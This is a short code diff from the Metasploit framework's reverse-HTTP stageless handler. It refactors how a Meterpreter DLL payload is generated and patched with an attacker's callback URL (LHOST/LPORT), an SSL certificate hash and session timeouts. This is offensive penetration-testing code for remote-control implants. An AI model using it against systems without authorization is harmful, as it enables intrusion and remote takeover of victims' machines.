@@ -26,25 +26,30 @@ module Handler::ReverseHttp::Stageless
     ], self.class)
   end
 
-  def generate_stageless(ssl, &block)
-    url = "https://#{datastore['LHOST']}:#{datastore['LPORT']}#{generate_uri_uuid_mode(:connect)}/"
-
-    unless block_given?
-      raise ArgumentError, "Stageless generation requires a block argument"
+  def generate_stageless(opts={})
+    unless opts[:generator]
+      raise ArgumentError, "Stageless generation requires a generator argument"
     end
 
+    if opts[:ssl].nil?
+      raise ArgumentError, "Stageless generation requires an ssl argument"
+    end
+
+    url = "http#{opts[:ssl] ? "s" : ""}://#{datastore['LHOST']}:#{datastore['LPORT']}"
+    url << "#{generate_uri_uuid_mode(:connect)}/"
+
     # invoke the given function to generate the architecture specific payload
-    block.call(url) do |dll|
+    opts[:generator].call(url) do |dll|
 
       verify_cert_hash = nil
-      if ssl
+      if opts[:ssl]
         verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                              datastore['HandlerSSLCert'])
       end
 
       Rex::Payloads::Meterpreter::Patch.patch_passive_service!(dll,
         :url           => url,
-        :ssl           => ssl,
+        :ssl           => opts[:ssl],
         :ssl_cert_hash => verify_cert_hash,
         :expiration    => datastore['SessionExpirationTimeout'].to_i,
         :comm_timeout  => datastore['SessionCommunicationTimeout'].to_i,
